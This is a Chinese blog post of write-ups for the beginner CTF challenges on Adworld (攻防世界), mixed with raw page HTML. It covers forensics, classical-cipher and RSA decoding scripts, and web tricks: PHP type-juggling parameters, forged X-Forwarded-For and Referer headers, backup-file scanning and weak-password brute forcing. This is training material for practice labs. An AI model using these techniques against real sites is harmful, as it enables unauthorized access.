获得flag。\n功夫再高也怕菜刀 Des：菜狗决定用菜刀和菜鸡决一死战。\n题目给了一个后缀为.pcapng的文件，用binwalk看看。\n使用命令binwalk -e分离文件，有一个空的flag.txt文件，用Wireshark打开原始文件看看，查找flag.txt字段。\n第189个包、195个包、639个包、第641个包都一样。\n第1150个包，多了一张6666.jpg图片。\n右键第1150个包，追踪TCP数据流。\n把高亮及后面的数据进行复制，然后在WinHex里新建一个文件，粘贴过去，文件大小不要太小就行，格式选择ASCII Hex。\n然后Ctrl+S保存为jpg文件，打开后获得一个密码。\n然后我们将这个文件手动分离出来：dd if=acfff53ce3fa4e2bbe8654284dfc18e1.pcapng of=1.zip skip=1422689 bs=1。\n按密码打开压缩包里的flag.txt。\n获得flag。\nsomethin_in_image Des：N/A。\nErik-Baleog-and-Olaf Des：N/A。\nbinwalk分析，为png图片，改后缀，使用StegSolve查看，绿1通道发现中间有一个二维码。\n截图保存二维码，继续放入StegSolve分通道查看，得到更清楚的二维码。\nhit-the-core Des：N/A。\n使用strings命令查看字符串，发现这么一段内容：\ncvqAeqacLtqazEigwiXobxrCrtuiTzahfFreqc{bnjrKwgk83kgd43j85ePgb_e_rwqr7fvbmHjklo3tews_hmkogooyf0vbnk0ii87Drfgh_n kiwutfb0ghk9ro987k5tfb_hjiouo087ptfcv} 前几个大写字母中间都隔了4个字符，上python输出一遍：\ndata = 'cvqAeqacLtqazEigwiXobxrCrtuiTzahfFreqc{bnjrKwgk83kgd43j85ePgb_e_rwqr7fvbmHjklo3tews_hmkogooyf0vbnk0ii87Drfgh_n kiwutfb0ghk9ro987k5tfb_hjiouo087ptfcv}' flag = '' for i in range(3, len(data), 5): flag += data[i] print(flag) glance-50 Des：N/A。\n一个gif图片，先看看属性。\n可知宽度明显不对，WinHex打开修改。\nCrypto flag in your hand Des：N/A。\nbase64 Des：元宵节灯谜是一种古老的传统民间观灯猜谜的习俗。 因为谜语能启迪智慧又饶有兴趣，灯谜增添节日气氛，是一项很有趣的活动。 你也很喜欢这个游戏，这不，今年元宵节，心里有个黑客梦的你，约上你青梅竹马的好伙伴小鱼， 来到了cyberpeace的攻防世界猜谜大会，也想着一展身手。 你们一起来到了小孩子叽叽喳喳吵吵闹闹的地方，你俩抬头一看，上面的大红灯笼上写着一些奇奇怪怪的 字符串，小鱼正纳闷呢，你神秘一笑，我知道这是什么了。。\n给了一个txt文档，内容:Y3liZXJwZWFjZXtXZWxjb21lX3RvX25ld19Xb3JsZCF9，Base64 在线编码解码 | Base64 加密解密 - Base64.us。\n获得flag。\nCaesar Des：你成功的解出了来了灯谜，小鱼一脸的意想不到“没想到你懂得这么多啊！” 你心里面有点小得意，“那可不是，论学习我没你成绩好轮别的我知道的可不比你少，走我们去看看下一个” 你们继续走，看到前面也是热热闹闹的，同样的大红灯笼高高挂起，旁边呢好多人叽叽喳喳说个不停。你一看大灯笼，上面还是一对字符，你正冥思苦想呢，小鱼神秘一笑，对你说道，我知道这个的答案是什么了。\n给了一个txt文档，内容:Y3liZXJwZWFjZXtXZWxjb21lX3RvX25ld19Xb3JsZCF9，凯撒密码在线加密解密 - 千千秀字 (qqxiuzi.cn)，尝试不同的位数。\n获得flag。\nMorse Des：小鱼得意的瞟了你一眼，神神气气的拿走了答对谜语的奖励，你心里暗暗较劲 想着下一个谜题一定要比小鱼更快的解出来。不知不觉你们走到了下一个谜题的地方，这个地方有些奇怪。 上面没什么提示信息，只是刻着一些0和1，感觉有着一些奇怪的规律，你觉得有些熟悉，但是就是想不起来这些01代表着什么意思。一旁的小鱼看你眉头紧锁的样子，扑哧一笑，对你讲“不好意思我又猜到答案了。”(flag格式为cyberpeace{xxxxxxxxxx},均为小写)。\ntxt文档内容: 。\n上脚本：\nstr = '11 111 010 000 0 1010 111 100 0 00 000 000 111 00 10 1 0 010 0 000 1 00 10 110' str = str.replace('1', '-') str = str.replace('0', '.') str = str.split(' ') dic = { # 26 个英文字符 'A': '.-', 'B': '-...', 'C': '-.-.', 'D': '-..', 'E': '.', 'F': '..-.', 'G': '--.', 'H': '....', 'I': '..', 'J': '.---', 'K': '-.-', 'L': '.-..', 'M': '--', 'N': '-.', 'O': '---', 'P': '.--.', 'Q': '--.-', 'R': '.-.', 'S': '...', 'T': '-', 'U': '..-', 'V': '...-', 'W': '.--', 'X': '-..-', 'Y': '-.--', 'Z': '--..', # 10 个数字 '0': '-----', '1': '.----', '2': '..---', '3': '...--', '4': '....-', '5': '.....', '6': '-....', '7': '--...', '8': '---..', '9': '----.', # 16 个特殊字符 ',': '--..--', '.': '.-.-.-', ':': '---...', ';': '-.-.-.', '?': '..--..', '=': '-...-', \"'\": '.----.', '/': '-..-.', '!': '-.-.--', '-': '-....-', '_': '..--.-', '(': '-.--.', ')': '-.--.-', '$': '...-..-', '\u0026': '. . . .', '@': '.--.-.' } def decode(x): flag = '' for i in x: if i == '': flag += ' ' else: change = dict(map(lambda t:(t[1], t[0]), dic.items())) flag += change[i] return flag res = decode(str) print(res.lower()) 获得flag。\n不仅仅是Morse Des：“这个题目和我们刚刚做的那个好像啊但是为什么按照刚刚的方法做出来答案却不对呢” ，你奇怪的问了问小鱼，“可能是因为还有一些奇怪的加密方式在里面吧，我们在仔细观察观察”。两个人安安静静的坐下来开始思考，很耐心的把自己可以想到的加密方式一种种的过了一遍，十多分钟后两个人 异口同声的说“我想到了！”。一种食物,格式为cyberpeace{小写的你解出的答案}。\n先把/符号给替换成空格 ，然后进行莫斯解密，上脚本：\ns = '' print(s.replace('/', ' ')) HHHH之后的字母全为A和B，猜测是培根加密，在线工具|培根密码加解密 (bugku.com)：\nATTACKANDDEFENCEWORLDISINTERESTING\rattackanddefenceworldisinteresting 获得flag。\n混合编码 Des：经过了前面那么多题目的历练，耐心细致在解题当中是必不可少的品质，刚巧你们都有，你和小鱼越来越入迷。那么走向了下一个题目，这个题目好长好长，你知道你们只要细心细致，答案总会被你们做出来的，你们开始慢慢的尝试，慢慢的猜想 ，功夫不负有心人，在你们耐心的一步步的解答下，答案跃然纸上，你俩默契一笑，相视击掌走向了下面的挑战。格式为cyberpeace{小写的你解出的答案}。\nBase64解码，\nASCII解码：\nLzExOS8xMDEvMTA4Lzk5LzExMS8xMDkvMTAxLzExNi8xMTEvOTcvMTE2LzExNi85Ny85OS8xMDcvOTcvMTEwLzEwMC8xMDAvMTAxLzEwMi8xMDEvMTEwLzk5LzEwMS8xMTkvMTExLzExNC8xMDgvMTAw Base64解码：\n/119/101/108/99/111/109/101/116/111/97/116/116/97/99/107/97/110/100/100/101/102/101/110/99/101/119/111/114/108/100 ASCII转字符：\nwelcometoattackanddefenceworld 获得flag。\n幂数加密 Des：你和小鱼终于走到了最后的一个谜题所在的地方，上面写着一段话“亲爱的朋友， 很开心你对网络安全有这么大的兴趣，希望你一直坚持下去，不要放弃 ，学到一些知识， 走进广阔的安全大世界”，你和小鱼接过谜题，开始了耐心细致的解答。flag为cyberpeace{你解答出的八位大写字母}。\ntxt内容：\n8842101220480224404014224202480122 获得flag。\nRailfence Des：被小鱼一连将了两军，你心里更加不服气了。两个人一起继续往前走， 一路上杂耍卖艺的很多，但是你俩毫无兴趣，直直的就冲着下一个谜题的地方去了。 到了一看，这个谜面看起来就已经有点像答案了样子了，旁边还画着一张画，是一副农家小院的图画，上面画着一个农妇在栅栏里面喂5只小鸡，你嘿嘿一笑对着小鱼说这次可是我先找到答案了。\ntxt内容：\nccehgyaefnpeoobe{lcirg}epriec_ora_g 用栅栏解密试试，开头有一点相似，但解不出来…W型栅栏加密，http://www.atoolbox.net/Tool.php?Id=777，按照提示栏数为5。\n获得flag。\neasy RSA Des：解答出来了上一个题目的你现在可是春风得意，你们走向了下一个题目所处的地方 你一看这个题目傻眼了，这明明是一个数学题啊！！！可是你的数学并不好。扭头看向小鱼，小鱼哈哈一笑 ，让你在学校里面不好好听讲现在傻眼了吧~来我来！三下五除二，小鱼便把这个题目轻轻松松的搞定了。flag格式为cyberpeace{小写的你解出的答案}。\ntxt内容：\n在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17\r求解出d python脚本：\n# 分解大整数 import math # 求欧拉函数f(n) def getEuler(prime1, prime2): return (prime1-1)*(prime2-1) # 19d - 920071380k = 1 # 求私钥 d def getDkey(e, eulerValue): # 辗转相除 k = 1 while True: if (((eulerValue * k) + 1) % e) == 0: (d, m) = divmod(eulerValue * k + 1, e) return d # 避免科学计数失去精度 k += 1 # 求明文 def getPlain(c, d, n): return pow(c, d, n) if __name__ == '__main__': p = 473398607161 q = 4511491 d = getDkey(17, getEuler(p, q)) print(d) 获得flag。\neasychallenge Des：你们走到了一个冷冷清清的谜题前面，小鱼看着题目给的信息束手无策，丈二和尚摸不着头脑 ，你嘿嘿一笑，拿出来了你随身带着的笔记本电脑，噼里啪啦的敲起来了键盘，清晰的函数逻辑和流程出现在了电脑屏幕上，你敲敲键盘，更改了几处地方，运行以后答案变出现在了电脑屏幕上。\n题目给了一个pyc文件，需要进行反编译。在python环境配置好的基础上，pip install uncompyle进行工具安装，然后使用命令uncompyle filename进行反编译，得到如下源代码：\nimport base64 def encode1(ans): s = '' for i in ans: x = ord(i) ^ 36 x = x + 25 s += chr(x) return s def encode2(ans): s = '' for i in ans: x = ord(i) + 36 x = x ^ 36 s += chr(x) return s def encode3(ans): return base64.b32encode(ans) flag = '' print 'Please Input your flag:' flag = raw_input() final = 'UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E===' if encode3(encode2(encode1(flag))) == final: print 'correct' else: print 'error' 解密脚本：\nimport base64 def decode3(ans): return base64.b32decode(ans) def decode2(ans): s = '' for i in ans: i = i ^ 36 x = i - 36 s += chr(x) return s def decode1(ans): s = '' for i in ans: i = ord(i) - 25 x = i ^ 36 s += chr(x) return s flag = 'UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E===' flag = decode1(decode2(decode3(flag))) print(flag) 获得flag。\n转轮机加密 Des：你俩继续往前走，来到了前面的下一个关卡，这个铺面墙上写了好多奇奇怪怪的 英文字母，排列的的整整齐齐，店面前面还有一个大大的类似于土耳其旋转烤肉的架子，上面一圈圈的 也刻着很多英文字母，你是一个小历史迷，对于二战时候的历史刚好特别熟悉，一拍大腿:“嗨呀！我知道 是什么东西了！”。提示:托马斯·杰斐逊。 flag，是字符串，小写。\n上网查询了一下转轮机加密，做题思路如下：\n先根据密钥对各行进行替换，然后根据密文，对第一列元素进行排列，对每行元素进行循环，每一列列出来，Des中提到了二战，唯一读的通顺的就是\n18:FIREINTHEHOLE 获得flag。\nNormal RSA Des：你和小鱼走啊走走啊走，走到下一个题目一看你又一愣，怎么还是一个数学题啊 小鱼又一笑，hhhh数学在密码学里面很重要的！现在知道吃亏了吧！你哼一声不服气，我知道数学很重要了！但是工具也很重要的，你看我拿工具把他解出来！你打开电脑折腾了一会还真的把答案做了出来，小鱼有些吃惊，向你投过来一个赞叹的目光。\n方法1 给了flag.enc和pubkey.pem两个文件，分别是密文和公钥，工具：3summer/CTF-RSA-tool: a little tool help CTFer solve RSA problem (github.com)。\n命令：\n.\\solve.py --verbose -k .\\pubkey.pem --decrypt .\\flag.enc 获得flag。\n方法2 pubkey.pem是openssl的文件类型，传统RSA公钥形式为(e,N)，用openssl解出e和N的值。kali自带openssl，使用命令 openssl rsa -pubin -text -modulus -in pubkey.pem对文件进行解析，或者RSA公私钥分解 Exponent、Modulus，Rsa公私钥指数、系数(模数)分解–查错网 (chacuo.net)http://tool.chacuo.net/cryptrsakeyparse)。\nRSA Public-Key: (256 bit)\rModulus:\r00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f:\r1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7d:\rbe:30:dd\rExponent: 65537 (0x10001)\rModulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD 其中65537为e的值，C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD为N的十六进制值，将其转换为十进制，结果为87924348264132406875276140514499937145050893665602592992418171647042491658461。\nfactordb.com计算p值与q值。\np=275127860351348928173285174381581152299。\nq=319576316814478949870590164193048041239。\n工具下载:ius/rsatool: rsatool can be used to calculate RSA and RSA-CRT parameters (github.com)\npython setup.py install\npython rsatool.py -o private.pem -e 65537 -p 275127860351348928173285174381581152299 -q 319576316814478949870590164193048041239，生成一个private文件。\nopenssl rsautl -decrypt -in flag.enc -inkey private.pem.\n获得flag。\neasy ECC Des：转眼两个人又走到了下一个谜题的地方，这又是一种经典的密码学加密方式 而你刚好没有这个的工具，你对小鱼说“小鱼我知道数学真的很重要了，有了工具只是方便我们使用，懂了原理才能做到，小鱼你教我一下这个题怎么做吧！”在小鱼的一步步带领下，你终于明白了ECC 的基本原理，成功的解开了这个题目，两个人相视一笑，快步走向了下一个题目所在的位置。flag格式为cyberpeace{x+y的值}。\n参考文章：\n椭圆曲线加密浅析 - 代码先锋网 (codeleading.com)\n上脚本：\n\"\"\" 考虑K=kG ，其中K、G为椭圆曲线Ep(a,b)上的点，n为G的阶（nG=O∞ ），k为小于n的整数。 则给定k和G，根据加法法则，计算K很容易但反过来，给定K和G，求k就非常困难。 因为实际使用中的ECC原则上把p取得相当大，n也相当大，要把n个解点逐一算出来列成上表是不可能的。 这就是椭圆曲线加密算法的数学依据 点G称为基点（base point） k（k","wordCount":"2454","inLanguage":"en","datePublished":"2020-01-03T22:06:50+08:00","dateModified":"2020-01-03T22:06:50+08:00","author":{"@type":"Person","name":"0opsdc"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://oopsdc.com/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"},"publisher":{"@type":"Organization","name":"0opsdc","logo":{"@type":"ImageObject","url":"https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png"}}}</script><script async src=//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js></script><meta name=referrer content="no-referrer-when-downgrade"></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://oopsdc.com/ accesskey=h title="Home (Alt + H)">Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://oopsdc.com/archives/ title=Archives><span>Archives</span></a></li><li><a href=https://oopsdc.com/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://oopsdc.com/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://oopsdc.com/about/ title=About><span>About</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://oopsdc.com/>Home</a>&nbsp;»&nbsp;<a href=https://oopsdc.com/post/>Posts</a></div><h1 class=post-title>攻防世界</h1><div class=post-meta>Created:&nbsp;<span title='2020-01-03 22:06:50 +0800 CST'>2020-01-03</span>&nbsp;·&nbsp;Updated:&nbsp;2020-01-03&nbsp;·&nbsp;0opsdc<div class=meta-item>&nbsp·&nbsp
        <span id=busuanzi_container_page_pv>Article Views: <span id=busuanzi_value_page_pv></span> times</span></div></div></header><aside id=toc-container class="toc-container wide"><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#%e6%94%bb%e9%98%b2%e4%b8%96%e7%95%8c aria-label=攻防世界>攻防世界</a><ul><li><a href=#web aria-label=Web>Web</a><ul><li><a href=#view-source aria-label="view source">view source</a></li><li><a href=#robots aria-label=robots>robots</a></li><li><a href=#backup aria-label=backup>backup</a></li><li><a href=#cookie aria-label=cookie>cookie</a></li><li><a href=#disable_button aria-label=disable_button>disable_button</a></li><li><a href=#weak_auth aria-label=weak_auth>weak_auth</a></li><li><a href=#simple_php aria-label=simple_php>simple_php</a></li><li><a href=#get_post aria-label=get_post>get_post</a></li><li><a href=#xff_referer aria-label=xff_referer>xff_referer</a></li><li><a href=#webshell aria-label=webshell>webshell</a></li><li><a href=#comman_execution aria-label=comman_execution>comman_execution</a></li><li><a href=#simple_js aria-label=simple_js>simple_js</a></li><li><a href=#newscenter aria-label=NewsCenter>NewsCenter</a></li></ul></li><li><a href=#web%e8%bf%9b%e9%98%b6 aria-label=Web进阶>Web进阶</a><ul><li><a href=#baby_web aria-label=baby_web>baby_web</a></li><li><a href=#training-www-robots aria-label=Training-WWW-Robots>Training-WWW-Robots</a></li><li><a href=#unserialize3 aria-label=unserialize3>unserialize3</a></li><li><a href=#web-php-unserialize aria-label="Web php unserialize">Web php unserialize</a></li><li><a href=#php-rce aria-label="php rce">php rce</a></li><li><a href=#supersqli aria-label=supersqli>supersqli</a></li></ul></li><li><a href=#misc aria-label=Misc>Misc</a><ul><li><a href=#reverseme aria-label=reverseMe>reverseMe</a></li><li><a href=#this_is_flag aria-label=this_is_flag>this_is_flag</a></li><li><a href=#pdf aria-label=pdf>pdf</a></li><li><a href=#give_you_flag aria-label=give_you_flag>give_you_flag</a></li><li><a href=#gif aria-label=gif>gif</a></li><li><a href=#%e6%8e%80%e6%a1%8c%e5%ad%90 aria-label=掀桌子>掀桌子</a></li><li><a href=#%e5%a6%82%e6%9d%a5%e5%8d%81%e4%b8%89%e6%8e%8c aria-label=如来十三掌>如来十三掌</a></li><li><a href=#simplerar aria-label=SimpleRAR>SimpleRAR</a></li><li><a href=#%e5%9d%9a%e6%8c%8160s aria-label=坚持60s>坚持60s</a></li><li><a href=#base64stego aria-label=base64stego>base64stego</a></li><li><a href=#ext3 aria-label=ext3>ext3</a></li><li><a href=#stegano aria-label=stegano>stegano</a></li><li><a href=#%e5%8a%9f%e5%a4%ab%e5%86%8d%e9%ab%98%e4%b9%9f%e6%80%95%e8%8f%9c%e5%88%80 aria-label=功夫再高也怕菜刀>功夫再高也怕菜刀</a></li><li><a href=#somethin_in_image aria-label=somethin_in_image>somethin_in_image</a></li><li><a href=#erik-baleog-and-olaf aria-label=Erik-Baleog-and-Olaf>Erik-Baleog-and-Olaf</a></li><li><a href=#hit-the-core aria-label=hit-the-core>hit-the-core</a></li><li><a href=#glance-50 aria-label=glance-50>glance-50</a></li></ul></li><li><a href=#crypto aria-label=Crypto>Crypto</a><ul><li><a href=#flag-in-your-hand aria-label="flag in your hand">flag in your hand</a></li><li><a href=#base64 aria-label=base64>base64</a></li><li><a href=#caesar aria-label=Caesar>Caesar</a></li><li><a href=#morse aria-label=Morse>Morse</a></li><li><a href=#%e4%b8%8d%e4%bb%85%e4%bb%85%e6%98%afmorse aria-label=不仅仅是Morse>不仅仅是Morse</a></li><li><a href=#%e6%b7%b7%e5%90%88%e7%bc%96%e7%a0%81 aria-label=混合编码>混合编码</a></li><li><a href=#%e5%b9%82%e6%95%b0%e5%8a%a0%e5%af%86 aria-label=幂数加密>幂数加密</a></li><li><a href=#railfence aria-label=Railfence>Railfence</a></li><li><a href=#easy-rsa aria-label="easy RSA">easy RSA</a></li><li><a href=#easychallenge aria-label=easychallenge>easychallenge</a></li><li><a href=#%e8%bd%ac%e8%bd%ae%e6%9c%ba%e5%8a%a0%e5%af%86 aria-label=转轮机加密>转轮机加密</a></li><li><a href=#normal-rsa aria-label="Normal RSA">Normal RSA</a><ul><li><a href=#%e6%96%b9%e6%b3%951 aria-label=方法1>方法1</a></li><li><a href=#%e6%96%b9%e6%b3%952 aria-label=方法2>方法2</a></li></ul></li><li><a href=#easy-ecc aria-label="easy ECC">easy ECC</a></li></ul></li><li><a href=#mobile aria-label=Mobile>Mobile</a><ul><li><a href=#easy-so aria-label=easy-so>easy-so</a></li></ul></li><li><a href=#reverse aria-label=Reverse>Reverse</a><ul><li><a href=#insanity aria-label=insanity>insanity</a><ul><li><a href=#%e5%81%9a%e6%b3%951 aria-label=做法1>做法1</a></li><li><a href=#%e5%81%9a%e6%b3%952 aria-label=做法2>做法2</a></li></ul></li></ul></li></ul></li></ul></div></details></div></aside><script>let activeElement,elements;window.addEventListener("DOMContentLoaded",function(){checkTocPosition(),elements=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]"),activeElement=elements[0];const t=encodeURI(activeElement.getAttribute("id")).toLowerCase();document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active")},!1),window.addEventListener("resize",function(){checkTocPosition()},!1),window.addEventListener("scroll",()=>{activeElement=Array.from(elements).find(e=>{if(getOffsetTop(e)-window.pageYOffset>0&&getOffsetTop(e)-window.pageYOffset<window.innerHeight/2)return e})||activeElement,elements.forEach(e=>{const t=encodeURI(e.getAttribute("id")).toLowerCase();e===activeElement?document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active"):document.querySelector(`.inner ul li a[href="#${t}"]`).classList.remove("active")})},!1);const main=parseInt(getComputedStyle(document.body).getPropertyValue("--article-width"),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue("--toc-width"),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue("--gap"),10);function checkTocPosition(){const e=document.body.scrollWidth;e-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect(),n=e.ownerDocument.defaultView;return t.top+n.pageYOffset}</script><div class=post-content><h1 id=攻防世界>攻防世界<a hidden class=anchor aria-hidden=true href=#攻防世界>#</a></h1><h2 id=web>Web<a hidden class=anchor aria-hidden=true href=#web>#</a></h2><h3 id=view-source>view source<a hidden class=anchor aria-hidden=true href=#view-source>#</a></h3><blockquote><p>Des：X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。</p></blockquote><p>查看页面源码。</p><p>获得<code>flag</code>。</p><h3 id=robots>robots<a hidden class=anchor aria-hidden=true href=#robots>#</a></h3><blockquote><p>Des：X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。</p></blockquote><p>在<code>URL</code>后加上<code>robots.txt</code>，得到一个<code>php</code>页面提示，访问对应<code>php</code>文件。</p><p>获得<code>flag</code>。</p><h3 id=backup>backup<a hidden class=anchor aria-hidden=true href=#backup>#</a></h3><blockquote><p>Des：X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！</p></blockquote><p>尝试<code>backup.php</code>，无效。</p><p>使用御剑扫描后台，得到<code>index.php.bak</code>，输入后下载备份文件，<code>cat</code>查看。</p><p>获得<code>flag</code>。</p><h3 id=cookie>cookie<a hidden class=anchor aria-hidden=true href=#cookie>#</a></h3><blockquote><p>Des：X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想:‘这是夹心饼干的意思吗？’</p></blockquote><p>使用<code>burp</code>抓包，得到<code>cookie.php</code>。</p><p>继续使用<code>burp</code>抓包，查看<code>Response</code>。</p><p>获得<code>flag</code>。</p><h3 id=disable_button>disable_button<a hidden class=anchor aria-hidden=true href=#disable_button>#</a></h3><blockquote><p>Des：N/A。</p></blockquote><p>页面的<code>flag</code>按钮无响应，猜测被禁用，查看控制台元素。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;btn btn-default&#34;</span> <span style=color:#a6e22e>disabled</span>&gt;
</span></span></code></pre></div><p>将此处的<code>disabled</code>前三字符删除，改为<code>abled</code>，按下按钮。</p><p>获得<code>flag</code>。</p><h3 id=weak_auth>weak_auth<a hidden class=anchor aria-hidden=true href=#weak_auth>#</a></h3><blockquote><p>Des：小宁写了一个登陆验证页面，随手就设了一个密码。</p></blockquote><p>查看源码。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>from</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;form-inline&#34;</span> <span style=color:#a6e22e>method</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;post&#34;</span> <span style=color:#a6e22e>action</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;./check.php&#34;</span>&gt;
</span></span></code></pre></div><p>有一个验证页面，访问它。</p><p>页面空白，查看源码，提示。</p><pre tabindex=0><code>&lt;!--maybe you need a dictionary--&gt;
</code></pre><p>这道题或许不需要字典？</p><p>尝试御剑扫描，无果。</p><p>好的我错了，随机输入用户名和密码，使用<code>burp</code>抓包，<code>response</code>显示用户名必须为<code>admin</code>，初次爆破无果，手动尝试<code>123456</code>，正确&mldr;.如果尝试继续用字典的话还是可以爆出来，只是比较费时间。</p><p>获得<code>flag</code>。</p><h3 id=simple_php>simple_php<a hidden class=anchor aria-hidden=true href=#simple_php>#</a></h3><blockquote><p>Des：小宁听说php是最好的语言，于是她简单学习之后写了几行php代码。</p></blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>show_source</span>(<span style=color:#66d9ef>__FILE__</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>include</span>(<span style=color:#e6db74>&#34;config.php&#34;</span>);
</span></span><span style=display:flex><span>$a <span style=color:#f92672>=</span> <span style=color:#f92672>@</span>$_GET[<span style=color:#e6db74>&#39;a&#39;</span>];
</span></span><span style=display:flex><span>$b <span style=color:#f92672>=</span> <span style=color:#f92672>@</span>$_GET[<span style=color:#e6db74>&#39;b&#39;</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ($a <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span> <span style=color:#66d9ef>and</span> $a) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> $flag1;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>is_numeric</span>($b)) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>exit</span>();
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ($b <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>1234</span>) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> $flag2;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>包含文件<code>config.php</code>，查看源码，无隐藏信息。</p><p>页面通过<code>GET传参</code>，根据条件<code>a=0且a为真</code>，<code>b</code>不能为数字且大于<code>1234</code>，添加<code>?a=0e1&b=12346s</code>，获得<code>flag</code>。</p><h3 id=get_post>get_post<a hidden class=anchor aria-hidden=true href=#get_post>#</a></h3><blockquote><p>Des：X老师告诉小宁同学HTTP通常使用两种请求方法，你知道是哪两种吗？</p></blockquote><p>跟着提示走，<code>URL</code>后添加<code>?a=1</code>。</p><p><code>hackbar</code>进行<code>POST</code>传参。</p><p>获得<code>flag</code>。</p><h3 id=xff_referer>xff_referer<a hidden class=anchor aria-hidden=true href=#xff_referer>#</a></h3><blockquote><p>Des：X老师告诉小宁其实xff和referer是可以伪造的。</p></blockquote><pre tabindex=0><code>X-Forwarded-For: 123.123.123.123
</code></pre><p><code>burp</code>抓包，在<code>Request</code>添加：</p><pre tabindex=0><code>Referer: https://www.google.com
